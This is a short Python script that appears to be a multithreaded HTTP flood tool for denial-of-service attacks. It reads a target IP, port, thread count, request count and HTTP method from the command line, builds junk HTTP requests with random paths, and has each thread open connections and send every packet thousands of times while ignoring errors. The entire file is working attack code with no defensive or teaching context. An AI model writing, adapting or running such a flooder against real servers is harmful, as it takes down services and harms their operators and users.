import socket,threading,random,string,sys

def http_flood(ip,port,method,count):
    pkt = []
    for _ in range(count):
     path = ["".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(1)) for _ in range(5)]
     packet = (''.join((f'{method} /%s HTTP/1.1\nHost: {ip}\n\n\r\r'*5)%(path[0],path[1],path[2],path[3],path[4]))).encode()
     pkt.append(packet)
    pack = 0
    for _ in range(count):
        try:
            packet = pkt[pack]
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip,port))
            s.connect_ex((ip,port))
            for _ in range(2500):
                s.send(packet)
                s.sendall(packet)
        except:
            pass
        pack += 1

ip = sys.argv[1]
port = int(sys.argv[2])
for _ in range(int(sys.argv[3])*5):
    threading.Thread(target=http_flood,args=(ip,port,sys.argv[5],int(sys.argv[4]))).start() # <IP> <PORT> <THREAD> <TIME> <METHOD_HTTP>
